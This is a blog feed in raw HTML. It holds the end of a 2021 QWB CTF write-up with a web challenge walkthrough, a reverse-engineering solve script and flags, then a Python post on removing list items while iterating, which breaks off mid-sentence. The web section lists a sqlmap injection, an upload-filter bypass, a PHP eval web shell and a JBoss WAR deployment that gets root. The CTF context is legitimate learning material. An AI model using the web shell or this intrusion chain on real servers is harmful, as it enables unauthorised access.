class="token punctuation">)</span>    <span class="token keyword">return</span> all_files<span class="token comment"># 传入空的list接收文件名</span>contents <span class="token operator">=</span> show_files<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 循环打印show_files函数返回的文件名列表</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> content <span class="token keyword">in</span> contents<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-=-=-=-=-="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> docx<span class="token punctuation">.</span>Document<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> paragraph <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">.</span>paragraphs<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"KEY"</span> <span class="token keyword">in</span> paragraph<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FIND IT!!!!!\n"</span><span class="token operator">+</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"NOT FOUND!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nALL DONE!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></code></pre><p>得到</p><pre class="language-plain" data-language="plain"><code class="language-plain">['xxx', 'xxx', 'KEY2&#123;T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS&#125;', 'xxx', 'xxx', 'xxx', 'xxx', 'xxx', 'xxx', 'xxx']</code></pre><p>然后提交KEY1和KEY2得flag</p><img src="/article/2021qwb/image-20210613213530156-4170508.png" class="" title="image-20210613213530156" loading="lazy"><h2 id="Easyweb-SOLVED-D0gekong"><a href="#Easyweb-SOLVED-D0gekong" class="headerlink" title="Easyweb | SOLVED | D0gekong"></a>Easyweb | SOLVED | D0gekong</h2><p>打开网址发现有三个东西，查看源码</p><img src="/article/2021qwb/image-20210613213721349-4170518.png" class="" title="image-20210613213721349" loading="lazy"><p>发现路由，都下载下来，有用的hint，其他没用</p><pre class="language-plain" data-language="plain"><code class="language-plain">Try to scan 35000-40000 ^_^.All tables are empty except for the table where the username and password are locatedTable: employee</code></pre><p>nmap爆端口</p><img src="/article/2021qwb/image-20210613213837935-4170530.png" class="" title="image-20210613213837935" loading="lazy"><p>得到36842端口，访问发现是登陆界面，给了表名 应该就是注入，试了下发现有回显报错，直接sqlmap跑</p><p>用户名：admin</p><p>密码：99f609527226e076d668668582ac4420</p><p>登陆成功</p><p>扫描发现<code>/file</code>路由有文件上传</p><img src="/article/2021qwb/image-20210614132600977-4170551.png" class="" title="image-20210614132600977" loading="lazy"><p><code>.php</code>绕过过滤</p><p>然后<code>./.php?1=shell.php&amp;2=&lt;?php eval($_POST[1]);?&gt;</code></p><p>连上shell，需要提权。扫进程和端口，没啥收获，最终应该是打JAVA的jboss</p><p>frp穿出来，根据文章<a href="https://blog.csdn.net/weixin_43999372/article/details/88364032">https://blog.csdn.net/weixin_43999372&#x2F;article&#x2F;details&#x2F;88364032</a></p><p>制作war包，上传后拿到root，读取根目录flag：</p><p>flag{V3ry_v3rY_E3si_a_w3B_Ch@1l3ng3}</p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a><strong>Re</strong></h1><h2 id="Easymath-SOLVED-Hn13"><a href="#Easymath-SOLVED-Hn13" class="headerlink" title="Easymath | SOLVED | Hn13"></a>Easymath | SOLVED | Hn13</h2><p>将字符串两个一组拆分并做short int传入函数判断相等，dbl数组用于比较。跟进去sub_13f3函数。</p><p>经过多组数据测试发现v3(i+1)与v(i)近似相等，因此v3 &#x3D; 2.718281828459045 - (double)i * v3两边的v3可以看作近似相等，(i+1)v3&#x3D;2.718281828459045，但是由于循环传入的值不能取得，因此相比答案i的值应该进一步-1，即(flag+2)*dbl&#x3D;e,flag&#x3D;e&#x2F;dbl-2，然后int端序与字符相反，再反一下即可得到正确答案。</p><p>脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">import</span> mathsegs <span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0.00009794904266317233</span><span class="token punctuation">,</span><span class="token number">0.00010270456917442</span><span class="token punctuation">,</span><span class="token number">0.00009194256152777895</span><span class="token punctuation">,</span><span class="token number">0.0001090322021913372</span>，<span class="token number">0.0001112636336217534</span><span class="token punctuation">,</span><span class="token number">0.0001007442677411854</span><span class="token punctuation">,</span><span class="token number">0.0001112636336217534</span><span class="token punctuation">,</span><span class="token number">0.0001047063607908828</span><span class="token punctuation">,</span><span class="token number">0.0001112818534005219</span><span class="token punctuation">,</span><span class="token number">0.0001046861985862495</span><span class="token punctuation">,</span><span class="token number">0.0001112818534005219</span>，<span class="token number">0.000108992856167966</span><span class="token punctuation">,</span><span class="token number">0.0001006882924839248</span><span class="token punctuation">,</span><span class="token number">0.0001112590796092291</span><span class="token punctuation">,</span><span class="token number">0.0001089841164633298</span><span class="token punctuation">,</span><span class="token number">0.00008468431512187874</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">b""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> segs<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token operator">/</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">+=</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;H"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token operator">/</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>脚本跑完直接出flag：flag{saam_dim_gei_lei_jam_caa_sin_laa}</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python dict的小发现</title>
      <link href="article/pythondict/"/>
      <url>article/pythondict/</url>
      
        <content type="html"><![CDATA[<p>记录下撸脚本的时候处理数据用到dict时的有趣发现</p><span id="more"></span><p>字典是另一种可变容器模型，且可存储任意类型对象。</p><p>先上</p><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: dicttest.py@Author: gyy@Time: 6月 08, 2021"""</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">resttask</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"剩余任务：%d 个"</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    rest <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        rest<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>rest<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ntest1\n\n"</span><span class="token punctuation">)</span>    time <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> user <span class="token keyword">in</span> data<span class="token punctuation">:</span>            resttask<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=========="</span><span class="token punctuation">)</span>            <span class="token triple-quoted-string string">"""                中间省略            """</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>                <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'C++'</span> <span class="token keyword">and</span> time<span class="token punctuation">:</span>  <span class="token comment"># 模拟出错情况</span>                    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>  <span class="token comment"># 本次选用的测试数据均没有任何主观意见</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    data<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>user<span class="token punctuation">)</span>  <span class="token comment"># 如果完成就移出此项</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                time <span class="token operator">-=</span> <span class="token number">1</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"All Done!"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ntest2\n\n"</span><span class="token punctuation">)</span>    time <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        resttask<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=========="</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> data<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 先pop出dict</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">"""                中间省略            """</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>            <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Java'</span> <span class="token keyword">and</span> time<span class="token punctuation">:</span>  <span class="token comment"># 模拟出错情况</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>  <span class="token comment"># 本次选用的测试数据均没有任何主观意见</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            time <span class="token operator">-=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span>  <span class="token comment"># 如果出错再给它加回进队列</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"All Done!"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getdata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C++"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Python"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"PHP"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"go"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Java"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"solidity"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span>  <span class="token comment"># 本次选用的测试数据均没有任何主观意见</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    show<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    test1<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    test2<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><hr><p>测试结果如下</p><pre class="language-none"><code class="language-none">&#123;&#39;name&#39;: &#39;C&#39;&#125;&#123;&#39;name&#39;: &#39;C++&#39;&#125;&#123;&#39;name&#39;: &#39;Python&#39;&#125;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;&#123;&#39;name&#39;: &#39;go&#39;&#125;&#123;&#39;name&#39;: &#39;Java&#39;&#125;&#123;&#39;name&#39;: &#39;sql&#39;&#125;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;test1new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：8 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;剩余任务：7 个[&#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;剩余任务：6 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;剩余任务：5 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;剩余任务：3 个[&#39;C++&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：1 个[&#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;All Done!test2new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：8 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：7 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：6 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;errornew cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：6 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;errornew cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：6 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：5 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：4 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：3 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：2 个[&#39;C&#39;, &#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：1 个[&#39;C&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;All Done!</code></pre><hr><h2 id="任务概况"><a href="#任务概况" class="headerlink" title="任务概况"></a>任务概况</h2><p>这个脚本是为了完成某任务，将所有用户存储在一个list里，即</p><pre class="language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C++"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Python"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"PHP"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"go"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Java"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"solidity"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span></code></pre><p>对于此任务，中间过程直接省略，有概率(不可定因素)会失败，所以有补错措施。</p><p>假使本任务补错措施完整，不会出现死循环情况。</p><p>对于本测试，模拟出错记录次数time为2次。</p><hr><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h3><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> user <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""xxx"""</span></code></pre><p>可见对于list中(下称用户集)的每个dict(下称用户)赋给user，然后进行处理任务(下称任务)，由于<code>while data</code> 必须所有用户全部完成任务才会结束。</p><h4 id="原思想："><a href="#原思想：" class="headerlink" title="原思想："></a>原思想：</h4><p>对于每个用户先全部做一遍任务，然后出错的用户由补错措施补错</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> xxxx<span class="token punctuation">:</span>  <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    data<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>user<span class="token punctuation">)</span></code></pre><p>如上，模拟完成任务就从用户集中移出此用户，然后如果有任务出错，用户还在用户集里，输出一行<code>new cycle!==========</code>，继续执行任务。</p><p>然而最终输出却是如下</p><pre class="language-none"><code class="language-none">test1new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：8 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;剩余任务：7 个[&#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;剩余任务：6 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;剩余任务：5 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;剩余任务：3 个[&#39;C++&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：1 个[&#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;All Done!</code></pre><p>出现了4次<code>new cycle!==========</code></p><h4 id="实际情况："><a href="#实际情况：" class="headerlink" title="实际情况："></a>实际情况：</h4><p>通过debug，可以看到</p><p>第一次：</p><img src="/article/pythondict/image-20210608170630964.png" class="" title="image-20210608170630964" loading="lazy"><p>移出后：</p><img src="/article/pythondict/image-20210608170648260.png" class="" title="image-20210608170648260" loading="lazy"><p>这里并没有什么异常，我们过四次看看</p><p>第四次：</p><img src="/article/pythondict/image-20210608170759998.png" class="" 